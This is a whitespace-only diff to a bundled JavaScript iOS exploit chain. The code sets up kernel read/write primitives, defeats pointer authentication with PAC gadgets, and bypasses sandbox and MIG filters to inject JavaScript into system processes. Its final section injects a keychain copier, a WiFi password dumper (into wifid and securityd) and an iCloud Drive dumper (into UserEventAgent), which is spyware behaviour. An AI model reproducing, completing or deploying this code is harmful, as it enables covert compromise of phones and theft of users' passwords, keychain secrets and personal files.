@@ -442,7 +442,7 @@
     let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
     let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
 
-    function DUMP(addr, sz) {}
+    function DUMP(addr, sz) { }
 
     function js_malloc(sz) {
         buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
@@ -1457,19 +1457,19 @@
     mpd_kwrite_length = kwrite_length;
     mpd_kread_length = kread_length;
     mpd_kwrite_zone_element = kwrite_zone_element;
-    mpd_control_socket = function() {
+    mpd_control_socket = function () {
         return control_socket;
     }
-    mpd_rw_socket = function() {
+    mpd_rw_socket = function () {
         return rw_socket;
     }
-    mpd_pacia_gadget = function() {
+    mpd_pacia_gadget = function () {
         return dyld_signPointer_gadget;
     }
-    mpd_kernel_slide = function(addr = 0n) {
+    mpd_kernel_slide = function (addr = 0n) {
         return addr + kernel_slide;
     };
-    mpd_kernel_base = function() {
+    mpd_kernel_base = function () {
         return kernel_base;
     };
     pe();
@@ -1698,7 +1698,7 @@
                                 if (!this.#invokingAddr)
                                     return false;
 
-                                if (typeof(this.#target) == "string") {
+                                if (typeof (this.#target) == "string") {
                                     console.log(TAG, `Start injecting JS script into ${this.#target}`);
 
                                     this.task = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__["default"](this.#target, this.#migFilterBypass);
@@ -2297,7 +2297,7 @@
                             static #prepareArg(arg) {
                                 if (!arg)
                                     arg = 0n;
-                                if (typeof(arg) === "string")
+                                if (typeof (arg) === "string")
                                     return get_cstring(arg);
                                 return BigInt(arg);
                             }
@@ -2423,7 +2423,7 @@
                                 }
                                 return a.buffer;
                             }
-                            static gc() {}
+                            static gc() { }
                         }
 
                         // Register global Native class
@@ -2594,7 +2594,7 @@
                                 /*
                                 let baseKernel = startSandworm();
                                 if (baseKernel == -1)
-                                	return false;
+                                    return false;
                                 */
                                 this.#kernelBase = mpd_kernel_base();
 
@@ -4340,7 +4340,7 @@
                                 return !Native.callSymbol("rmdir", path);
                             }
 
-                            static exists(path, permission = 0 /*F_OK*/ ) {
+                            static exists(path, permission = 0 /*F_OK*/) {
                                 return !Native.callSymbol("access", path, permission);
                             }
 
@@ -4721,7 +4721,7 @@
                                     0n);
 
                                 if (ret != 0)
-                                    console.log(TAG, `Error replying exception:${libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret)}`);
+                                    console.log(TAG, `Error replying exception:${libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret)}`);
                             }
                         }
 
@@ -5013,8 +5013,8 @@
                                 /*
                                 if (!this.gadget_pacia)
                                 {
-                                	console.log(TAG,`Doesn't have gadget_pacia, aborting`);
-                                	return 0;
+                                    console.log(TAG,`Doesn't have gadget_pacia, aborting`);
+                                    return 0;
                                 }
                                 address = address & 0x7fffffffffn;
 
@@ -5043,15 +5043,15 @@
                                 let outputBuffer = Native.mem;
                                 //console.log(TAG,`Before pacia`);
                                 if(pacia)
-                                	state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
+                                    state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
                                 else
-                                	state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
+                                    state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
                                 const buildVer = Offsets.getBuildVersion();
                                 if(buildVer && buildVer.startsWith("22"))
                                 {
-                                	//console.log(TAG, "Applying 18 fix");
-                                	//state.opaque_lr = 0x401n;
-                                	state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
+                                    //console.log(TAG, "Applying 18 fix");
+                                    //state.opaque_lr = 0x401n;
+                                    state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
                                 }
                                 //console.log(TAG,`After pacia with pc:${state.opaque_pc}`);
                                 //state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);
@@ -5065,33 +5065,33 @@
                                 let exceptionPort = Exception.createPort();
                                 if (!exceptionPort)
                                 {
-                                	console.log(TAG,`Cannot create exception port`);
-                                	this.#cleanup(pacThread,exceptionPort,stack);
-                                	return 0n;
+                                    console.log(TAG,`Cannot create exception port`);
+                                    this.#cleanup(pacThread,exceptionPort,stack);
+                                    return 0n;
                                 }
 
                                 //console.log(TAG,`Exception port:${Utils.hex(exceptionPort)}`);
 
                                 kr = Native.callSymbol("thread_set_exception_ports",
-                                	pacThread,
-                                	Utils.EXC_MASK_BAD_ACCESS,
-                                	exceptionPort,
-                                	Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
-                                	BigInt(Utils.ARM_THREAD_STATE64));
+                                    pacThread,
+                                    Utils.EXC_MASK_BAD_ACCESS,
+                                    exceptionPort,
+                                    Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
+                                    BigInt(Utils.ARM_THREAD_STATE64));
                                 
                                 if (kr != 0)
                                 {
-                                	console.log(`thread_set_exception_ports failed:${kr}`);
-                                	this.#cleanup(pacThread,exceptionPort,stack);
-                                	return 0n;
+                                    console.log(`thread_set_exception_ports failed:${kr}`);
+                                    this.#cleanup(pacThread,exceptionPort,stack);
+                                    return 0n;
                                 }
                                 let pacThreadAddr = Task.getPortKObject(BigInt(pacThread));
                                 //console.log(TAG,`PAC thread address:${Utils.hex(pacThreadAddr)}`);
                                 if (!this.#setThreadState(pacThread, pacThreadAddr, stateBuff))
                                 {
-                                	console.log(TAG,`Failed to set thread state`);
-                                	this.#cleanup(pacThread,exceptionPort,stack);
-                                	return 0n;
+                                    console.log(TAG,`Failed to set thread state`);
+                                    this.#cleanup(pacThread,exceptionPort,stack);
+                                    return 0n;
                                 }
                                 // Change pacThread PAC keys with those of remote thread
                                 Thread.setPACKeys(pacThreadAddr, keyA, keyB);
@@ -5100,9 +5100,9 @@
                                 let excBuffer = Native.mem;
                                 if (!Exception.waitException(exceptionPort, excBuffer, 100, false))
                                 {
-                                	console.log(TAG,`Failed to receive exception from PAC thread`);
-                                	this.#cleanup(pacThread,exceptionPort,stack);
-                                	return 0n;
+                                    console.log(TAG,`Failed to receive exception from PAC thread`);
+                                    this.#cleanup(pacThread,exceptionPort,stack);
+                                    return 0n;
                                 }
                                 let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
                                 let exc = new ExceptionMessageStruct(excRes);
@@ -5116,64 +5116,64 @@
                             /*
                             static #findGadgets()
                             {
-                            	let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
-                            	if (!sym)
-                            	{
-                            		console.log(TAG,`Symbol not found`);
-                            		return false;
-                            	}
+                                let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
+                                if (!sym)
+                                {
+                                    console.log(TAG,`Symbol not found`);
+                                    return false;
+                                }
 
-                            	let symStripped = sym & ~0xffffff8000000000n;
-                            	let gadgetOpcodesBuff = new ArrayBuffer(20);
-                            	let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
-                            	gadgetOpcodesView.setUint32(0,0xDAC10230,true);
-                            	gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
-                            	gadgetOpcodesView.setUint32(8,0xF100011F,true);
-                            	gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
-                            	gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
-                            	let data = Native.read(symStripped,0x1000);
-                            	let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
-                            	if (!gadgetOffset)
-                            	{
-                            		console.log(TAG,`pacia_gadget offset not found`);
-                            		return false;
-                            	}
-                            	this.gadget_pacia = symStripped + BigInt(gadgetOffset);
+                                let symStripped = sym & ~0xffffff8000000000n;
+                                let gadgetOpcodesBuff = new ArrayBuffer(20);
+                                let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
+                                gadgetOpcodesView.setUint32(0,0xDAC10230,true);
+                                gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
+                                gadgetOpcodesView.setUint32(8,0xF100011F,true);
+                                gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
+                                gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
+                                let data = Native.read(symStripped,0x1000);
+                                let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
+                                if (!gadgetOffset)
+                                {
+                                    console.log(TAG,`pacia_gadget offset not found`);
+                                    return false;
+                                }
+                                this.gadget_pacia = symStripped + BigInt(gadgetOffset);
 
-                            	console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);
+                                console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);
 
-                            	return true;
+                                return true;
                             }
 
                             static #setThreadState(thread,threadAddr,stateBuff)
                             {
-                            	let options = Thread.getOptions(threadAddr);
-                            	options |= 0x8000;	
-                            	Thread.setOptions(threadAddr, options);
-                            	let stateMem = Native.mem;
-                            	Native.write(stateMem,stateBuff);
-                            	//console.log(TAG,`thread:${Utils.hex(thread)}`);
-                            	let kr = Native.callSymbol("thread_set_state",
-                            		thread,
-                            		BigInt(Utils.ARM_THREAD_STATE64),
-                            		stateMem,
-                            		BigInt(Utils.ARM_THREAD_STATE64_COUNT));
-                            	if (kr != 0)
-                            	{
-                            		console.log(TAG,`Failed thread_set_state with error:${kr}`);
-                            		return false;
-                            	}
+                                let options = Thread.getOptions(threadAddr);
+                                options |= 0x8000;	
+                                Thread.setOptions(threadAddr, options);
+                                let stateMem = Native.mem;
+                                Native.write(stateMem,stateBuff);
+                                //console.log(TAG,`thread:${Utils.hex(thread)}`);
+                                let kr = Native.callSymbol("thread_set_state",
+                                    thread,
+                                    BigInt(Utils.ARM_THREAD_STATE64),
+                                    stateMem,
+                                    BigInt(Utils.ARM_THREAD_STATE64_COUNT));
+                                if (kr != 0)
+                                {
+                                    console.log(TAG,`Failed thread_set_state with error:${kr}`);
+                                    return false;
+                                }
 
-                            	options &= ~0x8000;
-                            	Thread.setOptions(threadAddr, options);
-                            	return true;
+                                options &= ~0x8000;
+                                Thread.setOptions(threadAddr, options);
+                                return true;
                             }
 
                             static #cleanup(pacThread,exceptionPort,stack)
                             {
-                            	Native.callSymbol("thread_terminate",pacThread);
-                            	Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
-                            	Native.callSymbol("free",stack);
+                                Native.callSymbol("thread_terminate",pacThread);
+                                Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
+                                Native.callSymbol("free",stack);
                             }
                             */
                         }
@@ -5611,7 +5611,7 @@
                             #pid;
 
                             constructor(param, migFilterBypass = null) {
-                                if (typeof(param) == "string") {
+                                if (typeof (param) == "string") {
                                     console.log(TAG, `Getting task by name: ${param}`);
                                     this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(param);
                                     //console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
@@ -5632,13 +5632,13 @@
                                 const buildVer = Offsets.getBuildVersion();
                                 if(buildVer && buildVer.startsWith("22"))
                                 {
-                                	threadmMem = Native.callSymbol("malloc", ExceptionThreadJS18.length + 1);
-                                	this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS18);
+                                    threadmMem = Native.callSymbol("malloc", ExceptionThreadJS18.length + 1);
+                                    this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS18);
                                 }
                                 else
                                 {
-                                	threadmMem = Native.callSymbol("malloc", ExceptionThreadJS17.length + 1);
-                                	this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS17);
+                                    threadmMem = Native.callSymbol("malloc", ExceptionThreadJS17.length + 1);
+                                    this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS17);
                                 }
                                 //Native.callSymbol("free", threadmMem);
                                 */
@@ -6075,23 +6075,23 @@
                                 Chain.threadSpawn(this.#exceptionThreadCFString, threadmem);
                                 let timeout = 10000n;
                                 if(largeTimeout)
-                                	timeout = 30000n;
+                                    timeout = 30000n;
                                 Native.callSymbol("usleep",timeout);
                                 let machThread = Native.read64(threadmem + 0x100n);
                                 Native.callSymbol("free",threadmem);
                                 let machThreadAddr = 0n;
                                 if(machThread == this.#dummyThreadMach)
                                 {
-                                	console.log(TAG,`remote thread didn't succeed, aborting`);
-                                	Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
-                                	Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
-                                	// This will wake up setter
-                                	Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, ExceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
-                                	Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
-                                	return false;
+                                    console.log(TAG,`remote thread didn't succeed, aborting`);
+                                    Thread.setMutex(this.#dummyThreadAddr, 0x40000000); // LCK_MTX_NEEDS_WAKEUP
+                                    Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
+                                    // This will wake up setter
+                                    Native.callSymbol("thread_set_exception_ports", this.#dummyThreadMach, 0n, ExceptionPort , Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES, BigInt(Utils.ARM_THREAD_STATE64));
+                                    Native.callSymbol("thread_switch", machThread, SWITCH_OPTION_NONE, 0n);
+                                    return false;
                                 }
                                 else
-                                	machThreadAddr = Task.getPortKObject(machThread);
+                                    machThreadAddr = Task.getPortKObject(machThread);
                                 */
 
                                 //Native.callSymbol("usleep",100n);
@@ -7005,7 +7005,7 @@
                                 chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
                                 chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
                                 */
-                                for (;;) {
+                                for (; ;) {
                                     let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_hdrAddr);
                                     if (nextAddr == 0n)
                                         break;
@@ -7905,12 +7905,12 @@
                                 /*
                                 let memory_object = new_bigint();
                                 ret = Native.callSymbol("mach_make_memory_entry_64",
-                                	0x203n,
-                                	get_bigint_addr(roundedSize),
-                                	localAddr,
-                                	this.VM_PROT_READ | this.VM_PROT_WRITE,
-                                	get_bigint_addr(memory_object),
-                                	0n);
+                                    0x203n,
+                                    get_bigint_addr(roundedSize),
+                                    localAddr,
+                                    this.VM_PROT_READ | this.VM_PROT_WRITE,
+                                    get_bigint_addr(memory_object),
+                                    0n);
                                 let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
                                 let resView = new DataView(resBuff);
                                 let port = resView.getUint32(0,true);
@@ -8719,7 +8719,7 @@
                     if (keychainCopier.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(keychainCopier.task);
                         keychainCopier.destroy();
-                    } else {}
+                    } else { }
 
                     // Inject WiFi password dump into wifid (has keychain access for WiFi)
                     // Using wifid instead of wifianalyticsd - wifid is always active
@@ -8728,7 +8728,7 @@
                     if (wifiDump.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDump.task);
                         wifiDump.destroy();
-                    } else {}
+                    } else { }
 
                     // Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
                     const securitydProcess = "securityd";
@@ -8736,7 +8736,7 @@
                     if (wifiDumpSecurityd.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDumpSecurityd.task);
                         wifiDumpSecurityd.destroy();
-                    } else {}
+                    } else { }
 
                     // Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
                     const userEventAgentProcess = "UserEventAgent";
@@ -8744,7 +8744,7 @@
                     if (iCloudDumper.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(iCloudDumper.task);
                         iCloudDumper.destroy();
-                    } else {}
+                    } else { }
 
                     // Wait for all dumps to finish
                     for (let i = 1; i <= 5; i++) {
